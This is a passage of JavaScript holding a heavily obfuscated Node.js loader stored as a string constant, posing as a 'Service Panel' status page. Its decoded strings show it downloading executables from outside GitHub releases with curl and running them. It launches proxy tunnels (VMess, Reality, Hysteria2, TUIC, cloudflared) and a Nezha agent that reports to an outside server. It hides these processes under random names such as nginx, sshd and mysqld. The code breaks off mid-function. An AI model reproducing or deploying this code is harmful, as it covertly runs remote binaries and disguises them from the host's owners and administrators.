const b = 'const _0x368d55=_0x47dc;(function(_0x84bb7b,_0x11c67a){const _0x59541b=_0x47dc,_0xa5e850=_0x84bb7b();while(!![]){try{const _0x2f6e89=-parseInt(_0x59541b(0x261))/0x1*(-parseInt(_0x59541b(0x216))/0x2)+parseInt(_0x59541b(0x199))/0x3*(parseInt(_0x59541b(0x1be))/0x4)+-parseInt(_0x59541b(0x1bb))/0x5*(parseInt(_0x59541b(0x192))/0x6)+-parseInt(_0x59541b(0x221))/0x7*(-parseInt(_0x59541b(0x1c7))/0x8)+parseInt(_0x59541b(0x1bf))/0x9+-parseInt(_0x59541b(0x203))/0xa+-parseInt(_0x59541b(0x266))/0xb;if(_0x2f6e89===_0x11c67a)break;else _0xa5e850['push'](_0xa5e850['shift']());}catch(_0x26a4d5){_0xa5e850['push'](_0xa5e850['shift']());}}}(_0x2a13,0xd302f));const http=require(_0x368d55(0x252)),fs=require('fs'),path=require(_0x368d55(0x25a)),os=require('os'),{spawn}=require(_0x368d55(0x249)),{URL}=require(_0x368d55(0x19b)),crypto=require(_0x368d55(0x1d9)),net=require(_0x368d55(0x24c)),CONFIG={'C_T':process[_0x368d55(0x25d)]['C_T']||'','B_D':process[_0x368d55(0x25d)][_0x368d55(0x1a5)]||_0x368d55(0x233),'C_D':process[_0x368d55(0x25d)][_0x368d55(0x1de)]||'','N_S':process['env']['N_S']||_0x368d55(0x20f),'N_P':process[_0x368d55(0x25d)][_0x368d55(0x1ad)]||_0x368d55(0x256),'N_K':process['env']['N_K']||'','N_T':process[_0x368d55(0x25d)]['N_T']||_0x368d55(0x250),'HY2_PORT':process['env']['HY2_PORT']||process['env'][_0x368d55(0x1f0)]||'','VMESS_PORT':process['env'][_0x368d55(0x22b)]||_0x368d55(0x227),'REALITY_PORT':process['env'][_0x368d55(0x1c3)]||'','TUIC_PORT':process[_0x368d55(0x25d)][_0x368d55(0x1ca)]||'','VMESS_UUID':process[_0x368d55(0x25d)][_0x368d55(0x236)]||_0x368d55(0x1b8),'TUIC_UUID':process[_0x368d55(0x25d)]['TUIC_UUID']||_0x368d55(0x1b8),'TUIC_PASSWORD':process[_0x368d55(0x25d)][_0x368d55(0x23c)]||_0x368d55(0x1dc),'HY2_PASSWORD':process[_0x368d55(0x25d)]['HY2_PASSWORD']||_0x368d55(0x1dc),'REALITY_PRIVATE_KEY':process['env'][_0x368d55(0x1e7)]||'','REALITY_PUBLIC_KEY':process[_0x368d55(0x25d)][_0x368d55(0x201)]||'','HY2_SNI':process[_0x368d55(0x25d)]['HY2_SNI']||_0x368d55(0x1a4),'VMESS_PATH':process['env']['VMESS_PATH']||_0x368d55(0x19a),'REALITY_SNI':process[_0x368d55(0x25d)][_0x368d55(0x1c2)]||'www.microsoft.com','REALITY_SHORT_ID':process['env'][_0x368d55(0x1c0)]||_0x368d55(0x1f1),'PORT':process[_0x368d55(0x25d)]['PORT']||0x1eb4,'MAX_RESTART_ATTEMPTS':0x5,'RESTART_DELAY':0xbb8,'HEALTH_CHECK_INTERVAL':0x3a98},WORK_DIR=path[_0x368d55(0x257)](process[_0x368d55(0x25d)][_0x368d55(0x1ae)]||os[_0x368d55(0x247)]());!fs[_0x368d55(0x232)](WORK_DIR)&&fs[_0x368d55(0x1a7)](WORK_DIR,{'recursive':!![]});const processManager={'processes':new Map(),'restartCounts':new Map(),'add'(_0x72d3c8,_0x319844,_0x3b62c2){const _0x2c5876=_0x368d55;this[_0x2c5876(0x23e)][_0x2c5876(0x253)](_0x72d3c8,{'proc':_0x319844,'config':_0x3b62c2}),this[_0x2c5876(0x1e2)]['set'](_0x72d3c8,0x0),_0x319844['on']('exit',(_0x408287,_0x1942b3)=>{const _0xc1bf62=_0x2c5876;serviceStatus[_0x72d3c8]=_0xc1bf62(0x1a8),this[_0xc1bf62(0x23e)]['delete'](_0x72d3c8),_0x408287!==0x0&&!this[_0xc1bf62(0x1b9)]&&this[_0xc1bf62(0x1e9)](_0x72d3c8,_0x3b62c2);}),_0x319844['on'](_0x2c5876(0x1c6),_0x124c72=>{const _0x2f06ec=_0x2c5876;serviceStatus[_0x72d3c8]=_0x2f06ec(0x1c6);});},'scheduleRestart'(_0x209aa1,_0x1d4ee8){const _0x189b48=_0x368d55,_0x1eae1a=this[_0x189b48(0x1e2)][_0x189b48(0x1c1)](_0x209aa1)||0x0;if(_0x1eae1a>=CONFIG[_0x189b48(0x1e5)]){serviceStatus[_0x209aa1]=_0x189b48(0x206);return;}this[_0x189b48(0x1e2)][_0x189b48(0x253)](_0x209aa1,_0x1eae1a+0x1);const _0x4ed5cb=CONFIG['RESTART_DELAY']*Math[_0x189b48(0x1aa)](0x2,_0x1eae1a);setTimeout(async()=>{const _0x3c779a=_0x189b48;!this[_0x3c779a(0x1b9)]&&await this['startProcess'](_0x209aa1,_0x1d4ee8);},_0x4ed5cb);},async 'startProcess'(_0x79fe87,_0x5a825a){const _0x580824=_0x368d55;try{serviceStatus[_0x79fe87]=_0x580824(0x21c);const _0x478345=await _0x5a825a[_0x580824(0x1ab)]();if(_0x478345)return this[_0x580824(0x1b2)](_0x79fe87,_0x478345,_0x5a825a),serviceStatus[_0x79fe87]='running',this[_0x580824(0x1e2)][_0x580824(0x253)](_0x79fe87,0x0),_0x478345;}catch(_0x2219bb){serviceStatus[_0x79fe87]=_0x580824(0x1c6),this['scheduleRestart'](_0x79fe87,_0x5a825a);}return null;},'killAll'(){const _0x1ec01c=_0x368d55;this['isShuttingDown']=!![],this[_0x1ec01c(0x23e)]['forEach'](({proc:_0x14594d},_0x4dff73)=>{const _0x205f0f=_0x1ec01c;try{_0x14594d[_0x205f0f(0x1dd)](_0x205f0f(0x222)),setTimeout(()=>{const _0x48f234=_0x205f0f;!_0x14594d[_0x48f234(0x1f7)]&&_0x14594d[_0x48f234(0x1dd)](_0x48f234(0x213));},0x1388);}catch(_0x3ca85d){}});},'getProcessInfo'(){const _0x1806fc=_0x368d55,_0x59bf52={};return this[_0x1806fc(0x23e)]['forEach']((_0x556b51,_0x45c8d3)=>{const _0xdea66b=_0x1806fc;_0x59bf52[_0x45c8d3]={'restarts':this[_0xdea66b(0x1e2)]['get'](_0x45c8d3)||0x0};}),_0x59bf52;}};let serviceStatus={'singbox':'stopped','cloudflared':_0x368d55(0x1a8),'nezha':'stopped','http':_0x368d55(0x1a8)},binaryFiles={};const HTML_TEMPLATES={'home':_0x368d55(0x197),'status':(_0x750206,_0x1d7cd4,_0x5040e1)=>_0x368d55(0x22c)+Object[_0x368d55(0x214)](serviceStatus)['map'](_0x45212a=>{const _0x5ad464=_0x368d55,_0x396ad7=serviceStatus[_0x45212a],_0x480480=_0x5040e1[_0x45212a],_0x5b37a9=_0x480480?_0x480480[_0x5ad464(0x1d5)]:0x0;return _0x5ad464(0x218)+_0x396ad7+_0x5ad464(0x194)+(_0x45212a[_0x5ad464(0x1f2)](0x0)[_0x5ad464(0x19c)]()+_0x45212a[_0x5ad464(0x1c9)](0x1))+'</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>'+_0x396ad7+_0x5ad464(0x209)+(_0x5b37a9>0x0?_0x5ad464(0x1f5)+_0x5b37a9+_0x5ad464(0x1b7):'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';})[_0x368d55(0x211)]('')+_0x368d55(0x258)+CONFIG[_0x368d55(0x26e)]+_0x368d55(0x246)+(CONFIG[_0x368d55(0x22b)]?_0x368d55(0x19e)+CONFIG[_0x368d55(0x22b)]+'</div></div>':'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(CONFIG[_0x368d55(0x20d)]?_0x368d55(0x254)+CONFIG[_0x368d55(0x20d)]+_0x368d55(0x25c):'')+_0x368d55(0x1e4)+(CONFIG[_0x368d55(0x1c3)]?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>'+CONFIG['REALITY_PORT']+_0x368d55(0x25c):'')+_0x368d55(0x1e4)+(CONFIG[_0x368d55(0x1ca)]?_0x368d55(0x24d)+CONFIG[_0x368d55(0x1ca)]+_0x368d55(0x25c):'')+_0x368d55(0x1c5)+_0x750206+_0x368d55(0x1b4)+(_0x1d7cd4[_0x368d55(0x259)]>0x0?_0x1d7cd4[_0x368d55(0x1cd)](_0x394e59=>_0x368d55(0x26a)+_0x394e59['protocol']+_0x368d55(0x265)+_0x394e59[_0x368d55(0x19b)]+_0x368d55(0x1fd)+_0x394e59['url']+'\x27).then(()=>alert(\x27Copied\x20'+_0x394e59['protocol']+_0x368d55(0x1db))['join'](''):'<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>')+_0x368d55(0x268)},PROCESS_NAMES=[_0x368d55(0x1a1),_0x368d55(0x26c),_0x368d55(0x215),_0x368d55(0x19d),_0x368d55(0x193),_0x368d55(0x263)];function _0x2a13(){const _0x36ba69=['stringify','killed','createWriteStream','/status','HY2_SNI','random','filter','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','floor','reality-in','createServer','REALITY_PUBLIC_KEY','none','5194220kYWhgd','amd64','match','failed','home','auto','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','generate','--report-delay','method','HY2_PORT','connect','nz.seav.eu.org','&fp=chrome&pbk=','join','message','SIGKILL','keys','mysqld','116HCQkUn','--no-autoupdate','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20status-','killAll','VMESS','trim','starting','VMESS_PATH','google','hysteria2://','write','326431qYdgqu','SIGTERM','delete','--region','singbox','Config\x20check\x20failed:\x20','8001','forEach','https://github.com/seav1/dl/releases/download/files/cf','/health','VMESS_PORT','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center;position:relative}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-starting{background:#fff3cd;color:#856404}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-error{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-failed{background:#6c757d;color:white}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.restart-count{position:absolute;top:5px;right:10px;background:#6c757d;color:white;border-radius:50%;width:20px;height:20px;font-size:12px;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.process-info{font-size:11px;margin-top:5px;opacity:0.7}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>setInterval(()=>location.reload(),10000);</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:location.reload()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','application/json','?insecure=1&sni=','arm64','10s','run','existsSync','loc.gov','cloudflared','HY2_PASSWORD','VMESS_UUID','randomBytes','TUIC_UUID','destroy','entries','cache.db','TUIC_PASSWORD','https://github.com/seav1/dl/releases/download/files/sb','processes','ignore','config.json','-arm','--url','stdout','includes','chrome','</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','tmpdir','push','child_process','vmess-in','&sid=','net','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','\x20HTTP/1.1\x0d\x0a','\x0d\x0a\x0d\x0a','--tls','writeHead','http','set','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','nezha.log','443','resolve','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>','length','path','has','</div></div>','env','text/html;\x20charset=utf-8','reality-keypair','VMess','24961kUTCfC','tuic','dockerd','Reality',':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','25599277jFrwNp','pipe','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','&alpn=h3#HY2','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','data','nginx','direct','PORT','exit','--edge-ip-version','toString','x64','Hysteria2','unlinkSync','N_T','curl','0.0.0.0','C_T','12gsjpOJ','node','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>','unhandledRejection','headers','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel\x20with\x20auto-restart.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel\x20v2.0</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','block','6slNlVC','/vms','url','toUpperCase','systemd','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>','arch','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#TUIC','sshd','setHeader','vless','www.bing.com','B_D','hy2-in','mkdirSync','stopped','.log','pow','starter','tunnel','N_P','WORK_DIR','running','status','end','add','cf_','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','--protocol','hysteria2','</div>','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','isShuttingDown','writeFileSync','4006755HbAkMd','https://github.com/seav1/dl/releases/download/files/nz','HEALTH_CHECK_INTERVAL','938216TcZeWt','15042303haWgmf','REALITY_SHORT_ID','get','REALITY_SNI','REALITY_PORT','host','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','error','296ALhnQE','uncaughtException','slice','TUIC_PORT','proc','N_S','map','127.0.0.1','SingBox\x20startup\x20failed:\x20','catch','xtls-rprx-vision','vmess','cloudflare','tuic-in','restarts','http2','Binary\x20file\x20not\x20found:\x20','nezha','crypto','Content-Type','!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','789456','kill','C_D','N_K','http://localhost:','getProcessInfo','restartCounts','curl\x20failed\x20with\x20code\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','MAX_RESTART_ATTEMPTS','cubic','REALITY_PRIVATE_KEY','stderr','scheduleRestart','tls','close','base64','\x20at\x20','TUIC','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=','SERVER_PORT','0123456789abcdef','charAt','utf8','upgrade','<div\x20class=\x22restart-count\x22>'];_0x2a13=function(){return _0x36ba69;};return _0x2a13();}function getRandomProcessName(){const _0x10d136=_0x368d55;return PROCESS_NAMES[Math[_0x10d136(0x1fe)](Math[_0x10d136(0x1fb)]()*PROCESS_NAMES[_0x10d136(0x259)])];}function _0x47dc(_0x115850,_0x31132f){const _0x2a136f=_0x2a13();return _0x47dc=function(_0x47dcb4,_0x198726){_0x47dcb4=_0x47dcb4-0x18a;let _0x157341=_0x2a136f[_0x47dcb4];return _0x157341;},_0x47dc(_0x115850,_0x31132f);}async function downloadBinary(_0x2cfd8e,_0x352d72){return new Promise((_0x250b68,_0x2ba15d)=>{const _0xcb4d42=_0x47dc,_0x34589b=spawn(_0xcb4d42(0x18f),['-s','-L','-o',_0x352d72,_0x2cfd8e]);_0x34589b['on'](_0xcb4d42(0x1eb),_0x395535=>{const _0x2adfb9=_0xcb4d42;if(_0x395535===0x0)try{fs['chmodSync'](_0x352d72,0x1ed),_0x250b68();}catch(_0x4c5ac1){_0x2ba15d(_0x4c5ac1);}else _0x2ba15d(new Error(_0x2adfb9(0x1e3)+_0x395535));}),_0x34589b['on']('error',_0x2ba15d);});}async function getServerIP(){return new Promise(_0x58372e=>{const _0x5d0587=_0x47dc,_0x375cb2=spawn('curl',['-s','ipv4.icanhazip.com']);let _0x25e9d8='';_0x375cb2[_0x5d0587(0x243)]['on'](_0x5d0587(0x26b),_0x4965bd=>{_0x25e9d8+=_0x4965bd['toString']();}),_0x375cb2['on'](_0x5d0587(0x1eb),_0xb884a0=>{const _0x1ffb07=_0x5d0587;_0x58372e(_0xb884a0===0x0?_0x25e9d8[_0x1ffb07(0x21b)]():_0x1ffb07(0x1ce));}),_0x375cb2['on'](_0x5d0587(0x1c6),()=>{_0x58372e('127.0.0.1');});});}async function startTempTunnel(_0x28b4df,_0x568441){return new Promise(_0x490118=>{const _0x61ff95=_0x47dc;for(let _0x1dcc98=0x0;_0x1dcc98<0x3;_0x1dcc98++){const 